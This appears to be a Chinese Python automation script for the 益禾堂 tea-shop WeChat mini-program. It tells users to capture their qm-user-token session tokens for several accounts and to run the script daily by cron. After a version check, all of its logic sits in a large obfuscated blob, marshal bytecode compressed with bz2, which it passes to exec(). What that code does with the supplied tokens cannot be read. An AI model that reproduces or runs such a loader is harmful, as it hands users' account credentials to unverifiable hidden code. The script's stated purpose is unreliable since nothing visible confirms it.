'''
vx小程序 -- 益禾堂手机点单
抓包 webapi.qmai.cn 下的 qm-user-token 多账号使用 # 分隔
export Yht_token='qm-user-token1#qm-user-token2'
author: 清风
name: 益禾堂手机点单
cron: 8 6 * * *

update:
    2024.09.03 更新种植活动
    2024.10.12 添加领取功能, 增加活动互助
'''

import sys
vesion = sys.version.split(' ')[0]
if vesion.split('.')[1] == "10":
    print(f'你当前的python版本为 {vesion},即将运行脚本...')
else:
    print(f'你当前的python版本为 {vesion},运行所需脚本环境为 3.10.x, 即将退出运行脚本...')
    exit(1)
    
try:
	import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(bz2.decompress(b'BZh91AY&SY1[>\xee\x00\x17\x05\x7f\xd3\xff\xf4 \x00\x00"\x7fg\x7f\xff\xff\xf0\xbe\xff\xff\xf0\x08\x00` \x00\x10\x00 \x00\x10`*\x1f>{\xc5\xf4\xc1\x96\x8c\xd8i\xefcu\x17m\xbb\x0fu\xefu\xce\xdd\xccz^r{7\xc9\xf1\xdb\xbd4\x1d\x02\x82\x86\x8f\xa7\xd0\xfai@\x07\xd2\x83\xd5==\x14P\x06\x9e\x9e\x9f9a\xd0;\xec\x1a\x00\x00t>\x8f{\x0f>\xe3\xdb\xefo/6\x9a\x81Wv"-\xe7\x12{\x9e\xe6{y]\x1d\xd9\xed\x87\x15U?\xf1\x18 4\x00\x00\x00\x01\x01%15\x08\x00\x06\x87\xa1UO\xf0\x00\x08\xc12\x1a\x10 \xa6\xa3CI\xa6F \xd3\x11\x80!\x84U?\xd3@\x00\x04\xd0I\xa8z\x9bT\xfc\x85M6\x89\x89\xa6\x10b\x00\x00\x04U?\xc9\xa6\x98!\x04\x98\xaa~j\x14\xffJ\x9f\x89\xa1\xa9\x00b\r\x00\x00\x00hES\xfc\x98@\x121#aJ~\x81OI\xe9\x88\xc8\x9a\x03\xd4\x1ah\x00\x00\x110@\x9aM\x03\t\x88\x014\xa3\xd9O!5<\xa6\x99\r\xa8\x01\xa6\x86\x9bQ\xe9\xec z\x96\xf9\xdd\xa0\x90\x03H\x83:\x08\x10\x88\xf9\x93\x84\xfc\x9f\xed\x06|\xd1\x9fh\xef_\x93\xdd\x18\x103\xe6\x1f\x04D/C\xced`\x123;\xd3\xd0\xd8-\xf8\x87g\xfc\xb8\xb0\r>\x9f\x87\x0fva\xf7\x80\xf9\x97\xe5\x91\x13\x1f\xd3\xe2\x17\xbb\xb5|\xbc\xbd\xb5\xa0\xcf\xdd\t\xbf\xea\x8b4a\xf5\xb9\x93\xdd\x11\xecq\xabm*U\xee\xfb\xea\xe0\xaa\xaaR\x90\x01\x10\x11Aq\xc6\xf7DN\x13iZ\x03\x17Z\x95\x8d\x15\x99\x14\x1e4\xfc>n\x86\xbb\xe8e\x16_\xc5\tg\xf4\xb5\x7fp\xdd\x0e\x92\xb1\xa2q\xa5\x02\xff\x8d\xa2\xdf\xb6G\x93\xa3y\xfe\x99*\x7f\xf3v\x87\x02{\xe6\xb5\xfde\xff\xea\xb3\xef\x882\x95w\x98\x8bE\xc3\xff\\_\xfcv\x9f\xad\xb4\xde\xe0\x81\x00~6\x88O\xa0\xfa\tS\x98\xca#7Tl\x05\xbf\xfa\xf1\xd0@x~\xb2\xc90vYxam\x97\x87\x9e\xb3_\x8e\x1a\x13\xa4:n\x0b\xe8\xcc\xf0\x99<\xe2i\xd8\xc4\x10\xfe51\xe5+L2~7\xec.+\xc0\xec\x86\xba\xf3\xa8\x87\x07\x01\xc6\x8a\x1d|\x87\xb3~t\x99\xdbI\x84\x1ct\x99\xef,\x84\xce\xcb\xf3\xb3\xc1\xa9y\xc9\rW1\'\xdegI\xc8\xf8h\x8a\xa1\x87\x0bel\xc9\x8a\xe6\xb6\x14\x8b\x7f?A\x06\x88I\x16-\x93`\xee\xdeu\xae#\xdfx\\\x88d\x0e\x01 .\xe9t\xa5\x8c:\xc6W\xc5\x14)\x92\x19=.c\xf4a\xad\xa4C@ti\x0bHUrC\x94x$\x1aQ\xb3\n\xccAh\'\x8d7[%\x9f\xf4\xd5\x06\xfb\'\xdb\x0b\xdb.\x1dg+\xb7K\xe7\xd1{\xd1\x1a\xd9C\x00e\xe7f\xcf\xb8\x91"\t;*\xf8\x8cl\xfa\xd3\xca\x99j\xb3\x95\x8b\xb2\xe5\xa08x\xf7-\x0f!e\xeb\xdd\xa47\xb7Zm\xd4\xe9\xda/]\xa9\xa6\xb8[I\xd9\x9d)\xf1\xd6{\x99[\xd8v\x99\xa9\x8e+\xb1@\\<\x03\xc6O\xf5\xcc\x84[\x04\xa1\x19\xb4x5Hwd\x815\xba\xa8\x01\x00\x9fv\xf6\x8d\x86/f\xf7\xb4\xcbM\xcc\x18r\x84P\x99\x1c\xfe\xc2\xd7\x93D\x17\xe1)|\x1e\xf8y\t.Vq\x9c{q\xbf\x8e\xf4\nS\x95\\\x19\xc1\xbddZ\x8d\x16\x0b@v\x80\xb5tX\xf4\x99l#\xf8\x8c\x16E\x91\xb1x\xf7\x06\x02\n2E7|\x1fn\xbadtdn|C\x82\xf19\x0e\x17\xb5\x0c\x85\xcd\xebZE\xf0\xae\xc9^\xdc\x99\xad\xd2V\xf7\xac3\xe0\xb3K\xdd\xb1C\xcel\xa3\x8b\xffty\x15\x0e\xe4^\xba\xfb\xfd\x98:\xa6<\xe1)lk\xae\xa7\xac"!\x937n\xfc<D\x99\xfckr\xe4fX\xb3X\t\x91\x1er1\xf5\x8d\xfd\xb4-M\xaa\xden\xbe\x85fG\x8b\x91\xdc\xb0" u9\xef\x97\x0e\x8a.\n\x8d)/C\x0f\xb7\xaf^\xcc/\xc5Q\x00X\x8e\x1b\xa83\xe2\xc2)\xa6{b\xf7^\x9c\xf4\xac\x90\xa0\xb3;\xeb\x92\xc6F\x8fO}j\x14\xe4\xef\x92\xc5\x081%\xca\x8a\xac\xf0\xab\xb8\xc0\x14{\x1d\x16#\x04\x03\x90@\xc9!\x1a\x1f\xce\x9b\xd8\x80\x16\xf5\x90:\x90\xbey\xfe\x85\xc7\xf5w\x1cI\xe1\xeb@\xc4\xa4\x91\xf7\xd0UIA{*\xc3\x1a\x10\xd5\xea\x02\x1a-Q\x9d,\xb2\xc4O1\xd4\xa36\xa8\x0cM\xd1\xad!!\x0ev\x15i\x13@i*\x10f@\x9d[\xeb\x80\xc0\xb28\xdd\x97M*\xa0s\x92\xaaT\x08\xb4\xb1d\x18]4y\xa8%\xe8p\x8c]\xc9\x14\xed\xc5\xde\xc5\xca\xde\xe8\xf7\xd9Q\xa3o\xd6\xf4\xbc4j\nM\xde\x1a\xc3C!m\xd7\xc4\xbd\xf2\x1fH!\xb8\x8f%\x01\xc1\xa3\xc6\x8f\x07\xa1_q\x19\r\xd3H\x9f\xc9\x9dX\xfbo9\xdc^H\xba-:\x82`\xd8\x157\xa1/\x85\x1a!\xbap\xe0Z\'\xd3\x899%I\x85\xda^\xa2q\x9ax\x01z\x03\x0f \xf5\xd6\x18\x8a\xde"\x9e&Y\x1fx\xc3\xa0\xedQ\x9f\xb6\x89$\x81L\xbd\xafF\xefQ\x18\xb6X\xedj\xecD\xd9\xf9OOq\xc7\xc8\x9dB`\'iX\x1c\xed\xcd\x82\x1b\xf2\xae\xe6\xe2\x8d\x96\xb6bN\x1e^\x13\xc9n8\x0fNj\x8b\xa9x\xadk@\xf0\x08\x89\x92\xa2\xbb\xaf\x05\xeb8\xbb\xfc\xbd|\xfaS\x80\xb5\xb8\xe8\xdew\xf3?m\xae]\xc8\x9b\xf7\xe5)\xe1\xaa\xe61vW\xf1\xe5F\n\xd6\x17\r\x90\xf3\xae\xc2\xa8\xc35\xbc\xd9D!\x02\x0b\xb6\xaf\xd3.\xe87\x8f^f\xd1\x95\xfb)\'U5\xd6\xe8q\x9c\xefQ\x96\x99)\x0e\xbc\x18\xd3\xb42&\xb0\xce\x83\xc2\x8br\xe8\xc0\xb4[D\xd6`\x90\xa5\xb6\xce\xda\xab\xe4V\x9d\xe2\x86[\x13\x91\x98|\x15QK{\xdeNy\x08\x11\x92+)\xa9\xb1\x1b\xb8\x92\xdc\xce\x82c{\xce\x1d;\xedMr\xb0Hn\xd4c\x0e\x8b\xa9J\xe5\x00m\xd4j\xc7\xab\xc6H\xdbz\xbfx\xe9\xc3\xbb\xe4\x88\x82\xb1\xcd\xf9\x96t(\x17\xb7b\xc4M*rH\xf6~\xd9\x9d\'\xee\xe4m\xcd\xf4M\x1d\x84\xd2~\'\xcc\x8ag$K\xe5\x80\xda\xe4\x10\x87nN~`F\xd7=Z\x93;M\x17\xa1\x8e\x10\xcc\xbd\xaa\xe3\x14Ts3\xea\xfbD\xc6r\xb0\x9dr\xf1]\xf4\xba\xa3\xb3\xf6\xd7b\x898\xd0\xdc\x06JH\xa2M\x14sT\xd5\x86\xbeT\x86\xd9l\x9f5+\x85\x17F\xa2\xcaJ\x85\x17\xb7.\xa0,p0\x8fX\xb5\x08\x1a\xbd\x91BnD\xc1.\xf2plV\x96T\x915\xf4\xe25\x86:\xb2\x91\xa9\x9a\xadj\n\x89\xf1\xac\xc3\xb5\xcfB\x08f\xe8\xf8\xc0\x9a\xad\x89\x99\x82(\xa0\xcd0U\x99M\n\x06\xc1KR\xc0\xca\x8a\xb4\xa1\xc2\xd5\x9dl\xf04\xa5X\xda\n(\xa1hF\x06\xb1\x85Z\x84\x08F,\xa1\x01kC\x12\x125\x94\x84T]\x9c\xc1\xc8\xd9B\xb4w\x8a5LI\xc9+\x1e/SzX\x16\tFe \x05;\t\xa5@\x99\xd9\xc2\x8bO\xe5\xf4p\xd1\xe1\xb4\xc1\x9e\xff\xf6\xc1\xf0\xf0\x0f\x89\x9f3\xb7\xb8\x11o\x08\xb1\x9cD\x19+\x0f\x7fW3\xe57\x180:\x80{\xc4\x83P\xf5\xec\xf4\xa5\x19}\x94 \xef\xd8\x05\xe3~B\x19rdY`\x1b\xc9\x1b\xf8x|l\xa4\xe7\xa9\xe8b,\x9d\xa3\x08Md\n\xd6\xc1\xf4q\xbb\x822*\x81\xce\xf7kqEU@\xa1\x08\x9a|\xdc\'-\x0ez=swv\xf7\xcal\x95$\xf5\xe0\'`\x11p\x9a\xa4( c\x04X\xf1\x11\x05\x16\x10\xe3\x16\x02P\x82\xc0!\xea\x94\xa7y\r\xe0\xc1\x0b\xc4\x126Cq\xb1\xc5\xdbyJ\xd7X\x11Cr\xc48_\xa9YG!\x8a`\xc3(%\xe0I\xa2\xe7\xd2h\\\xd92\x85I\xdc\x14h\xe7J\x96-\x88dd\x8a\x822\xcatTR\xd7\x86\xd0:\x83,^\x11\x03\x1a\xe2(\x134\x11)%#\\(\x8b[\xa6\x12\x14\'\x0b\xe5\x10seuq\xf5w\x89\xd3V5>?\xe3\xe1\x9c\x06\xb8\x9b\x10t\x88>\x89_k\xb3\xa4-\x82\x95\xe0\xd2?\x051\x818\x1f\xa0\xdf\xa5\xc7\x80\xa3\xc2\x01>\x87\x04\xb0,Z%\x85\xa0%?j\xeb\xaa~\x1b\xac\xe2cp\\\xeb\xce\x9f\x03\xc2\x938\xc76p\x9euG\x83\x94\x9f\x18\x99\x93\x9csI\xd3\x9b\xe4\xa2\x10\x15\x03s\xa3\xe5r2\xe6x\xb2#!A\xe411%\x0e\xc8\xa0\xe8\xcc\x11\x96\xd0\x92\xb5=\xd7]`f\x04Xm\xc5\x9aD&s\xd2\x98\xbf\x1d\xb4\xd2\xb2\x98\x10|\x18\xde\xaa\xfa\xa566\x1bf:\xc1%\x83\x0b\xf1l\xddK\t<\x04\x8e~\x19\x84@%\x95mHN\x95\x8a6z&\x84m\x14\xbe\xe3Y\xd3\xec\x15p\xf6J\xcev\xa2\x87!Ca\xc8J\xb1\xd1\x9f\x8f\xc0<JF+\x96\xe7\xe4\x9b~\x0f\xb5t\xe5\xfe@\'\xdd\xf6\xbe\xafw\xdd\x8a\xfd\x8f\xf8\x91Skj\xcahD\x18\xe1\xd3E\xde\x93\xaa5\x7f\xea\xb9\x1a\xb8\x1f \xe6\xeb\xb6\xeeX\x14/\xa1\xbed\x8c-\x13G6\xfbA\xd0\xc5\x85%^tc\xab\x0c\xde\xa2\x87,\xbbu\x98\x922\xbd\xdc\xaf\xb4\xa789\xf9\xe5!\x1c\xcf\xef\x99\xe6_\x07\x80 \x98\x1d%\x82\xce\x8c\x84%\x86\xa66\x86c/5(&\xc1\xd0\xc7\xd1G@OF \xc8a\x1csk<<\xdd\x13j\xe5"\x8f\xca\xedKQD\xa7\xc4\'Gj\xedz\xc2\xd6\xca\xc6\xa2\xb2!\xa3\xcf!N\xda\xe9j\n\x12h0P/s8\xb5\x15\xe0\x118\x01\xd1%\xa2\xc2\x81\x1f7\x97\xb0:\x86\xbaiy-4J\xd73\x9dm\\>\xa9\xec>I\x08\xb4\xfa\x16E\xeb\xb4K\xe3\xea|\xc2@\x06\x1e\xc8\xbe\xda\x1f6\xa0\x99\xb4\xd2\n\xd0d\xb1Ku\xdf\xd7\x14zL\x96\xa6\xf3u\x94\xc8)\xd1\x1a\xeaI-\xa1\x82\xe3\xae|yk\x9e\xba\xab\xb1\x96\xed\xb0\x0e \xe0@6\x13\x00\x88\xf8\x08\x80\x04,f\xb8\xdb\r\x04u`C\x8e\x12\xa4Cc\xba\xd2\xdc\x19+\xd3+\x8e\x89pHw\xddY\xc3(\xc1YD\x1b\xbe\x8eMC\x82pM\x14\xb9\x82F\xe2\xc7+\x8e\x94b\x8f\x82I.h$:\x1f\xc6\n_\xa1h\xb4q\xdc\x19d\xc2\xbc\n|\xb3Q30\xc0\xd0+[\xef#\xa4\xf35\xf7\xac\xdc\xb3];\xbdl"C\x05\x11[a{\x96~\xda\x00\xd8[|l&\xa9\x12\x00g\xad\xf7\xc7\x17\xef\xe2\x0e\xc076\x13\x8f\x06\x82|\x8ea\xba\xcaA\\\x04A\xfb"\xbd\xfa\xe5\xaczs\xbaBz\xec\x8b&\xdd\xe9\x9e\xbc8\xb0\xd5@vO\xbdZ\xfcd\xfdR\xe4\xd76fT\xc4\xc0P\r;L\xe3,s\xa8\x8e+\xad\xa3\xbed`\xc2U\xe4\xde\xe9%\x1b\x7f\x1bz\xcb2\x8e\n\x836R\x80\x9bp\x86\xe5s\x8a\xbe\xa4\x83\xbaY\xf4\xbe)\xb4{\xa3#L-\xa1`\xb2:\xd9fs\x84\xf0\t\x8dJ\xc7\xc5#\xc6v\x05\xcf\xea\xa5QD\x15\xbe\x9f\xdbRhu\xa0\x11P\xc8\x04\xa2A+\x8f\x0eZ\xf2R\x885f\xcdy\xfc\x8a\xd5"\xbc\xa6\x82\x88E\x1fPn,\xa5^\x9e\x9d\\\xd1-\xfe\x8a\xcd\x14\xb8P\xd4I\x80\x98\x84\x9f\xf1\xb7\xc4W]\xbe:\xeai\x8c!\xd8LD\xb5r\xf5\xf0\x0b\xce\xbb\x16\xc0[P\'l\xeb{\xed\x8fr\xd46/\x87\xa8\xcf\x03\x88\xd4\xa1\xde\x14\x9c5$\xf6\xf50_\x03\x03\x0c+\xeah\xd6w\xa96N\x95\xa0\xf4\x05\x18\x18\xd122Rq\x89z\x8d\xa8\xc4\x1d#\x9anF\x13$\xcb\x86\x1e\xae\x12:\x8c\xd4z6\x0bF\xb2x[\xe4\x8cc\x86S\xb4\xb5j\xbd\xc2mc\x80\x8a\xf1\x04\n\xcd\x96\xa7!\xc8&A\xe2\xe3Wk\xdd\xdc\x1d\x11\xea\xdb\xb03Q\x16\xb6\xad\\*W\xa2/\xdf\xf9\xc8\xe3\x00"\x18g"\xac\x08]t\xb0\xe78S\x84b\x91fh@d\xd9\xbe\x14;\x98+a\x0b-\xee\xb6\x1c\x95\\\xa7\xa6\rp2A\xf5`\xdc\xd1\x8f.L\xb1\xa8\x1cq\x1a\xc4\xce\x1eO6\xe2\x86\xf8\x00\xe45\x99\x8a\x11\xb2\xee\x8d\xd7\x89\xd1\n\xbd,P\xc2\xef\x83\xc3\x9b\xabD\xe7B;\x0e\xf8\x99w\xa2\xd6\x0f\xc2\x1c\xf7L\xa8\xb3\x94\xf0\xe6]\x0f\x8a\x14\x1d\xb5I4C\x86\'\xa9\xb5\xae\xd6j\x17|\x12\t^\xf5x\xdc\xe3U\xe6>\x10?l\xfd*\x94\xf1\xbc{j\x8d\x07\x9d\x8fw[\xaf\xd8%W\xea\xa2\x00\xf7\x8dRGX-\tTE\xe2@\x188\xc7p\x10\x08U+\x04\x18\x0c\x84-b\x02y]\xde\x18:\x08\xb8L\x86 \x160\xc94\xf3\xaf\x81\x14AP5\x89\xd3\x15T\x83\x1f\xae\xcfb\x9b\x10\x16\xd6\xdb,/\xb4P\x99e\x88\xa9\xabX\xddAq\xa4&y\x9e\xc9m\x14\xac\xd7\xbd\xf3\xbb\xdc\xc5&\xd9\xd7}i\x8cJ\xe9\xad\x80\xf5A\xd7K\xc5\x9d\xc5\xe5\xd3M\x80\x96x\xd6RD\x1c\xf9\x9c\xa8\xc2\x8f],\x1b\x91\x96\x80\x85\x01\'j\xaa,\x05\xafy\xc8x\x92\xc3\x85\x8c\x92b\xb7J[\xa2\x91D\xa2\xd8\xe7W\xc3Q\xed0\x8c\x94l\x10\xd3\xe0\x01\x1e\\\x1f$\xa0\xfb6*\x93\xde\x0b\x9a\xd5c\xeaU)\xba\x96\xd2\xda|/\x18B2N\xae\xc8\xdb\x93B\x04\xb7\xe2H&\x05\xa4\xf6\xac\xd4b\x90o~\x99\xa0\x1fAg \xc6\xa7Et\xe7\xc1@\xfb\xb1(\xa6x\x06\xbaT\xa4"(5\x05\xecl\xc0\xe9\xbb\xf7\xdd\xb5\xc3c\xbf\x12\xb1;\xbcdV\xdak\x9c\xe9\x9a2\xd2\xee\x81\x9a\xd9R\xd8t\xba\xd5\xb8\xfb\xae\xb9\xf7\x14-\x1f%?\xce\xff\xe7\xc0\xad\x86\xa7\xe1?^\xee\xb0\xb5\xd2\xb4\xdf\xbc_\xc1\x02\xd5n\x7f\xff\xfa\xf5:\xcci\xb5\xc1\x896\t=\x9e\x88\x81\xe7\xbf\xbb\xb8\xc5:\xb8\x95\xf4.\xfd\xc96\x93\xd9\x16E"\t&\xf9\xa3\xca6\x9d\x10e\x9bA\x0214\xc2\xcb\xa0\x8a\rA\xca\xf1c\xc0\x0b\xd7\xfe"\x8f\x13\xd1\xc9\x8b=\xa3\x7frY\xfcY\xf9Gn\x90\xae\xa3\'\xef\xefI*\xff\x03\xd9\xe6 \xcb\x9e\xe3Z\xc9f"\xb4\xe3u\xab\xb7\xd3\xcc\xcb\x87\x98\xb9\xb7\ri\x834\xe9\xaa\x9c\x12\xd5\xb7\x7f\xaf\x13\x06\xad\xebE\xec\xea\xc3\xef\xaa\x9c\x88=]\'\xa8\xf5\xe0\x804\x9d11\x80\xa6.q\x87R\xa9\xee\xb5\xa4\xb4~\x81\\\x12\xad\x90\xdf\xa3\xcb\x1a\xea\xa6>\xb9\xb1\xa6q,\x8cp\x12\xbfK\x83Y\xbf-b=B\xc1\xa4ZX\x98\x8f\x18H\xcb\'%\xaaS\xaf\xab*u\xba\xc1^f\xb3\x18u\xaan\x94\x8f\xb5\xc8\xeb\x9e~\x7fvc`Y\xb4\xce\x17\xd2\x06\t\x11H\x98\x17\x9bb{^\xc8\x96\x81\xff,\xbdZS\xb1\x0e\xec\x1b:\xbf,\xaft8\xd9\x14\xaem\x8a\xdb{\x92\x87\xe6\x93\x86=^\xa9A?\xb4Q\x14X\x99h\xfc\xd7\xa8FA\x0cc\x9a\x8b\t\x11\xb8e\x0b\xf6\xc8#\xe0\xc8f\xaa\xa4\x92\xbf1\xd8SoJ\xd3\x170\xd7\xde\xe9\xb3\xbb\x8fP\xef^\x0c\xca\xff\xa2\xab\x19\xe7\x13\xf1\x05\xa6\xc1}\xa3\x9c\xb6\xbaK\xb0a\xed\xfc\x81\xb9|\xbd\xfb\xcb>O\x03 \xb4\x92~|\xa4\x98n\xe8-]\xb16Yjha\xa1\xd9[\xb5C\xd0/:\x08e)\xa9\xc6\'g\x8a\xe9\x93\xb3(\r.\x1e\xb98>\xc6\xd9\xa14\xf0\x18_\xad \xcf\xc9\xd0rgW\x9c\x87fM\x01%\xf2H\xf7\xa2c0\x1f(\xb8\x06\x85\x08p\xc1u\x94`\xdbJH\xc4\xbe\x04\xb8ZmZ)N\xf7@W\xb3\xac\xd2\x1d\x7f>\xb9\x9d_0\x80\xed\xc8\xb2\x8a`-#.I\xa6\xc6{\x1f\x8a\x19\xbe\xcd\xe3g\x15B\xd1\x13\x8e(\x8a\xe3B\xad\xd5\xdf\x84"\xb0\t\x88\xb6\x9e\x82Z\xda\xc9\x10\xdcJ\xf1$J\xe3\x12\xc5\xc1O.\xceL\x1c6\xb9X\\\x8c_]\xc4\xa7\xedZ\xccA\xec\x911f\xfe\xae\xc5)\x95$Y\xa5\xdbs\xb3cfb|\x8cB,\xe2\xca\xb2\xf8o\xb5\x05V\x1eq\xa2a7\x8d:\xe6\xd1&P\x1dw\x94x8qY\xbbaCT\x91ZM\xc8\x14K\xc5p\xa2\xfa|y\xe9*\xa7\xd3\x83\xd7\xdf\xd6\x98\x16"\xfe\xe48\xf1\xb15\xc6m\xb0o\xa3\xa6\x89\x0fc 9|S\x89\xe4:vX&CPm\xe9\x9c\xd1\xa1\xb7\xde\x82\x8e\xbd?\xe6\x89\xfcv\xcb\xea:g\x93\x0cM\x05\xedd\x935\xbcg=0b|\x17w:\x1e\xf6\xb2\xd4\xba\xdf\xb5P\x19(o,\xba\x806x\xbc.\xdf\xec\xd43T\x95\x8b\x83;\x19\xd2\xcco\xe1\x1e\x99hC\xb2e\xe3}S]\xa8\xce\x07xAo\x81}\n\xd2\xcb7X\xd8\xc0ai\xe5\x08&J\x14\xbf\x9e\x8f\xc80\xaa\x08YyO\xee\x94\xab|\x17\x065\x04\x0es\xc1\xac>`\x89Zr\xf95:\xe7S\xbcdg\x8b\xeeS\x9e\x94\x8a\x032$:\xe6\xbb\xbd\xa5\xb3,q\x00\xde\xba\x1b\x8c\r\xf8\xefg\xc7Yd\xf7\xb0\xde9\xb7\x9a\xa1\xd5)\x9f\x03\xb7r\xf3\xdbP:\xbe\xc4\xac\xf6\xc4\xce\xbe\x14\x8f\x96\xa6S\x8d\x15\xb4\xbdx4\xab\xcc\x1f\x86\xca\x17U2\xe6\xe5\x87@@\x84\xfd%D\x05k\x0c\x8fh\x105"\xb5t\xc5\xaa:\xe7\xdfK\xd7\x19\xcd\x9b1a>\xaem\xb3\xef\xb1zo\xfb\xd4\xafT\xe9\xd6R1n\xc3s\xbe\xa0\xa6\xc1jW}\\d$\xc6\x97\xc7\xc0X1\x0f\x00\xde\x95\x19\xa8\xa46y1\r\x89\x87;\xde\xf6\xc5\x1fw\x80\x9b@e\x0e\xd03\xb1D\xd6\\\xe3BN3\x93M\xa8oF\xe3\x97\xda\xf1\x8em\x17J>\xc0\xd8YY\x83\xea\xa0\t\xe3\x8e+}\xeb\xc1jZmUD\xab\xd1\x03\xe9\xa5/\xb4\xf3\x83\xb1\xf9N\xc9ZQ\xbe\xce/e&\xbe\x1a\x94\x9a\x15\x1f\xcc\xa6\xa9J\xb3\xd1\x1a\xc8wP 2Q\xa1T2\xa0\x15\xfc\xe7\xfd#\xb2\x1b\xbe\xe5\x8a<#\x1e\xc6!\xa2\xe3H{\xf9\x8f-<t\xc9\x84\x8a#\xc2\\\xe9\x1b\xa1\xf4-\x7fb\xdc\x15\xc2\x8e\x1b\xf3t\x0e;K\x81\xa7\xc4\xcc7\xb0Y\x96 \x86^\xa1u\x0b\x15\xafsq\xfbb\x1f\x12\xeb\x86\x9bo>\xefb\x03\x18\x01\x9f\xe1\x8cp\x98a\x11H,\x04`\x80\xe1m\xdf\x7fF\xb5$F\xbd\xde\xb8\xd4\x008\x08k\xc5\x84\xc3\xcb\x93O\x88\xb0\x84\x03\xacA\xa2\x0c\xe9?\x12\x0f\r\xcb\x87\xbbv/\x1e\xc9\x1b\x82X\x84L\x89\x0cO4\x83:\xfb\xe7\x07uR\xba\x91Z\xcf+\xb2\x1eX|\x0b3\xe1s2\xc2\xb3f\xaf\x95\xd0\xc7~\xe9&\x97\x01\xf7n\x0e\xba*\x07\x97#\x0f\x01Eq\xe7x\x05\x05n\x05\x9f\xc0\xafl\xcd\xafe\x98E+\x8d\x1fH\xac\xfc\x84\x05\xae!@\x80_ne\xaf\x9b\xa1\x89\xce\xec\xa6\xe2\x0f\xb4\xa1\xf8\xdd\x0fV:\xac4\xf2\xef_\x8d\x0cl@\x13C\xaa\\\xe1\xf4\xae\xeeA\x9b8}7y\r\xe3Q\xed,T\x19f\xe24\x02y\xe3\xd3rZ\x83\x036\xfaP\xf7\x0f\xb4\xbd1\x1a\xab\x93\xd5tYbstUj\x93\xd9\xe3\xdc\xf9=\xda\xcc\xc0\xb5\xf4\xd0\x1c\x95R\x85\x7fJOupP\x01,\xc8x\xa8\xb8\x05\xee\x1c\x01\x95\xe7GF\xd5mm\x1dTf\xddL\xa5t*\xfc\x9fEc7Q\x9cu\xb4\x82\xd0\xe8D\xbf7O+\xec\xc3S\x0e\x89\x9b=T\x8b\xa2\x9a\x17d\xe8v\xa4\xd1EvmA\xb5D\xbcq\x9a1\x8a\rb-\xb0\x92\r\xd3\xe3\xe9\xd4\xc3\xcd\x89\xfa\x1fr\xb2\xedj\xf1\xec4\xf7\xa9zDr\xbd\'&3_P]\xe6S\xady\xdc9\r\xa24\xe9 :\xa8\xdd\x81<^\\\x9eG\n\x89\xc8\xbf\xeb\x05C\x7fK\x83xKt\x84S\xe0fi\xd7*\x90\xee\xa8B\xdc\xf7\x05a\xb7)\x9f\xd8\x8f\x055\x0e\xa9\x1f=\xae\xf0\xac\xe5g\x05X\xc7\xafY\x97\x87\x90\xdbn\x148G(\t\x91p\x07\xfd4\xa2dm\x83\x89\x97\x7f\xf3\x86\xddj\xee\x86\xc7\xab\xc8\xc7\xf7@\x06/\xd64G\xca\xfe\xb5\xd6\x9awaL\xde\x8e\\\xef5p\xae\x89y\x98\xab\x89\x99\x1a\xbf\xea\x1c\xed\xf3\xc4\xa4\t\xe5\xe5\xb0{M\x95\xb6nf\x82&\xfdU\xef\x80\x11\x86\xa8\x01\xf6}\x94D\xa3\x03\xed\xe7\n;!up\rGy\x15H\xfd\xb4\x023\xcd\xa0\xcf\xbc\x99s\xaeW5\x02\x95\x11{\x01\xcc]H\xb3(\xac\xbb\x14\x1fG\xd9\xdew2`4\x97\xbc)2\x15\xadD\xb6\xc8\x8e\xd9\xde\xae\xe9\xa6\xc3\xfd\x12\xd6/\'\xb1V\x9d0}u\xbdUtL\xfb\xf8\x8d&\xcb\xbf\xc8\x05g\xa4t\xb7Ur\xd3e\xc85M\xe2p\x19o\xb2j\xb6\xf8\xff$\xa9\xe0d!~^\xbf\xf0oS\xff!S\xc2\xb0q\xbb\x93\xdb_\x10\xcf\xb9u\xbf\x16)\xb0\xabo\x8d\xc2\xfc\xd3\xcb\x00\xb1\xefi\xc7\xec$]\x95\x1e\x88Id\xde\xbd\'\x06yX\x0e\x89\xc5\xc5\x88A\xb8L\x11\xcb\x07\xdf\xd0kP\xe4m\x11P\xa9C\xb3\xd8H\xbc\xcb^\xb2\x95\xb9\xe3\xd3{I\xe0\x01x\xec\x10\xee\x03\xf5s\x03\x15\xd4(7\xfa\xcf\x87`\xa3(/m-+\xe0}\xce\xd9^\xb54\xbc\xb3_\xbf\xcd>\xfe\x90\x08C(\\p\x14\x009\xdeV\x04B\x02\xac\xb1:\xc8\x06\xdd\xf1\x87-\xe3\x97\xb8\xc1\\\r\xf7\x8e\x8a\'\xb6WD\xd8\x96\x0f\x96Ng\xa1\x12\xd7\xc7\xc4V\xc9\xf8\xfe\xbf\x8c\x0b9.\xa0\x1d\x05\xf6Mw\x0f<\xbf\xba\xa7E\xdc\xb3\xe1\x7f\xc8\xd4\x14\x8d\x06\x85+\x0e\xebq\xf3mr-\x0e\xc9t.\xe5v\x05\x9coQ\xe5]Fb\xe3\x10\xebn\x96\xddbBeW\x9d\x98j\xd7\xb6W\xc5\x8a\xc1\xef/ti\x14\ry\xcf?7(5\xa4l\xea\x8b\xccD\x0b;\x91\xfc\x9a\xdb\x97e\x90\x15\xe9?H\x0c\x16"\xe3\xeb\xc9\xdd)t\x89\xa8\x1f\xfb-*K\xa6\x9b\x8c\x98\xd4V\xd0\xb3\x85p\x0b.\xd6\x97[\x0c]\xf3\xa1\x93\x0e\xca\xac\x06\xee\xc1{M\xdaY\x97\xa5t3\x8e\xcb\xf9C\xf4FA\x83U\x14Ta\x1b\n\x8b\xbc \xf4\x84\xe7\xf8_\x142\x14U`\xcerZ\xda\x8c\x12 9\x01\xae\x8a\xbd\xc8\x9d\xbd\xccQ\x05\x1d\x16Y\xf4~\xbf;\xd1w\xddq6|\xa0\xcf\x85\xdc\xdf\x1b~\xef\xbaB\x9dy\xef\xe6\xf09\xc3\x97\x10K\xd2\xdf_\x8a\xeb#q\xbdK\x17\xea\xa5e\xc1\xc2(\xd3\x1a\x1fJy\xad\xde\x1c\xf4\x15.X\x0e_\xe5\x95\xe6w\xc8\xfc\x1fZ\x1f\xafj\xf8\x08\xd5 